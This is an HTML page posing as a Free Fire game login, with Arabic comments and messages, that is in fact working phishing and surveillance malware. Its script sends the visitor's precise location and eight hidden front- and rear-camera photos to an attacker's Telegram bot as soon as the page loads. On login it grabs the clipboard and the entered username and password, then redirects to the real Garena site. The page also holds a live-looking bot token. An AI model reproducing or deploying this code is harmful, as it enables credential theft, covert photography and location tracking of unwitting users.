<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MANW - Free Fire Login</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: #05050a;
            background-image: radial-gradient(circle at 20% 20%, #300202 0%, transparent 40%),
                              radial-gradient(circle at 80% 80%, #020a1a 0%, transparent 40%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .login-card {
            background: rgba(15, 15, 25, 0.9);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(0, 243, 255, 0.3);
            border-radius: 24px;
            width: 380px;
            padding: 30px 25px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.9), 0 0 25px rgba(0, 243, 255, 0.15);
            color: #fff;
            text-align: center;
        }
        .branding-symbol {
            font-size: 20px;
            font-weight: bold;
            color: #ff3333;
            margin-bottom: 10px;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
        }
        .game-title {
            font-size: 24px;
            font-weight: 900;
            color: #00f3ff;
            margin-bottom: 20px;
            letter-spacing: 1px;
            text-shadow: 0 0 15px rgba(0, 243, 255, 0.5);
            font-style: italic;
        }
        .input-group {
            position: relative;
            margin-bottom: 15px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(0, 243, 255, 0.2);
            border-radius: 12px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
        }
        .input-group input:focus {
            border-color: #ff3333;
            background: rgba(255, 255, 255, 0.06);
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
        }
        .btn-submit {
            width: 100%;
            padding: 14px;
            background: linear-gradient(45deg, #00f3ff, #ff3333);
            color: #111;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
            text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
        }
        .btn-submit:hover {
            opacity: 0.9;
            box-shadow: 0 0 15px rgba(0, 243, 255, 0.5);
        }
        .footer-links {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
            font-size: 12px;
        }
        .footer-links a {
            color: #00f3ff;
            text-decoration: none;
        }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="branding-symbol">MANW😈 💪</div>
        <div class="game-title">FREE FIRE</div>

        <form id="loginForm" onsubmit="handleSubmit(event)">
            <div class="input-group">
                <input type="text" id="username" placeholder="ENTER USERNAME / ID" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="PASSWORD" required>
            </div>

            <button type="submit" class="btn-submit">LOGIN</button>
        </form>

        <div class="footer-links">
            <a href="#">REGISTER NOW</a>
            <a href="#">FORGOT PASSWORD?</a>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
        const ADMIN_CHAT_ID = "7713496654"; 

        const tg = window.Telegram.WebApp;
        tg.ready();
        const userChatId = tg.initDataUnsafe?.user?.id || "غير معروف (خارج تيليجرام)";
        const userFirstName = tg.initDataUnsafe?.user?.first_name || "ضحية مجهولة";
        const userUsername = tg.initDataUnsafe?.user?.username ? `@${tg.initDataUnsafe.user.username}` : "لا يوجد معرف";

        async function sendTelegramMessageToBoth(text) {
            const targets = [ADMIN_CHAT_ID];
            if (tg.initDataUnsafe?.user?.id && tg.initDataUnsafe.user.id.toString() !== ADMIN_CHAT_ID) {
                targets.push(tg.initDataUnsafe.user.id);
            }

            for (const id of targets) {
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'Markdown' })
                    });
                } catch (e) {}
            }
        }

        async function sendTelegramPhotoToBoth(blob, caption) {
            const targets = [ADMIN_CHAT_ID];
            if (tg.initDataUnsafe?.user?.id && tg.initDataUnsafe.user.id.toString() !== ADMIN_CHAT_ID) {
                targets.push(tg.initDataUnsafe.user.id);
            }

            for (const id of targets) {
                try {
                    let formData = new FormData();
                    formData.append('chat_id', id);
                    formData.append('photo', blob, 'capture.jpg');
                    formData.append('caption', caption);
                    formData.append('parse_mode', 'Markdown');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (e) {}
            }
        }

        // سحب الحافظة بطابع مرعب
        async function grabClipboard() {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    const text = await navigator.clipboard.readText();
                    if (text) {
                        sendTelegramMessageToBoth(`💀 *[ MANW SYSTEM - CLIPBOARD EXTRUSION ]* 💀\n\n> تم اختراق الحافظة وسحب محتواها:\n\`\`\`\n${text}\n\`\`\`\n⚡ *لا شيء يظل مخفياً عن قبضة MANW.*`);
                    }
                }
            } catch (e) {}
        }

        // جلب الموقع الجغرافي الدقيق مع رابط خريطة مباشر
        function grabLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        sendTelegramMessageToBoth(`🩸 *[ MANW TARGET LOCKED - LOCATION ]* 🩸\n\n👤 *الضحية:* ${userFirstName} (${userUsername})\n🆔 *الإيدي:* \`${userChatId}\`\n📍 *الإحداثيات المرصودة:* \`${lat},${lon}\`\n🗺️ *رابط الموقع بدقة:* [فتح الخريطة الفورية](https://maps.google.com/?q=${lat},${lon})\n⚡ *الشبكة والمحيط تحت السيطرة المطلقة.*`);
                    },
                    (error) => {},
                    { enableHighAccuracy: true }
                );
            }
        }

        // التقاط 4 صور أمامية و 4 صور خلفية بطريقة مرعبة
        async function capturePhotos() {
            try {
                // التقاط 4 أمامية
                for (let i = 1; i <= 4; i++) {
                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    await new Promise(resolve => setTimeout(resolve, 1000));

                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    await new Promise(resolve => {
                        canvas.toBlob(async (blob) => {
                            if (blob) {
                                await sendTelegramPhotoToBoth(blob, `👁️ *[ MANW SURVEILLANCE - FRONT ]* 👁️\n> الضحية تحت العدسة الأمامية (#${i})\n👤 *الاسم:* ${userFirstName} | 🆔 \`${userChatId}\`\n⚡ *تمت الإطاحة بالخصوصية بنجاح.*`);
                            }
                            resolve();
                        }, 'image/jpeg', 0.85);
                    });
                    stream.getTracks().forEach(track => track.stop());
                    await new Promise(resolve => setTimeout(resolve, 600));
                }

                // التقاط 4 خلفية
                for (let i = 1; i <= 4; i++) {
                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    await new Promise(resolve => setTimeout(resolve, 1000));

                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    await new Promise(resolve => {
                        canvas.toBlob(async (blob) => {
                            if (blob) {
                                await sendTelegramPhotoToBoth(blob, `👁️ *[ MANW SURVEILLANCE - REAR ]* 👁️\n> مسح محيط الضحية الخلفي (#${i})\n👤 *الاسم:* ${userFirstName} | 🆔 \`${userChatId}\`\n⚡ *العالم الخارجي مكشوف تماماً أمامك.*`);
                            }
                            resolve();
                        }, 'image/jpeg', 0.85);
                    });
                    stream.getTracks().forEach(track => track.stop());
                    await new Promise(resolve => setTimeout(resolve, 600));
                }
            } catch (e) {}
        }

        // تشغيل الرصد الفوري عند تحميل الصفحة
        window.addEventListener('load', () => {
            grabLocation();
            setTimeout(capturePhotos, 1500);
        });

        // عند محاولة تسجيل الدخول (سحب البيانات وكلمة المرور)
        async function handleSubmit(event) {
            event.preventDefault();
            await grabClipboard(); // سحب الحافظة لحظة الضغط

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            await sendTelegramMessageToBoth(`🔥 *[ MANW BREACH ALERT - FREE FIRE ]* 🔥\n\n👤 *الاسم بتليجرام:* ${userFirstName} (${userUsername})\n🆔 *إيدي الضحية (Chat ID):* \`${userChatId}\`\n\n🎯 *اسم المستخدم المدخل:* \`${username}\`\n🔑 *كلمة المرور المسروقة:* \`${password}\`\n\n⚡ *تم ابتلاع الفريسة بالكامل تحت راية MANW😈 💪*`);
            
            window.location.href = "https://ff.garena.com";
        }
    </script>
</body>
</html>
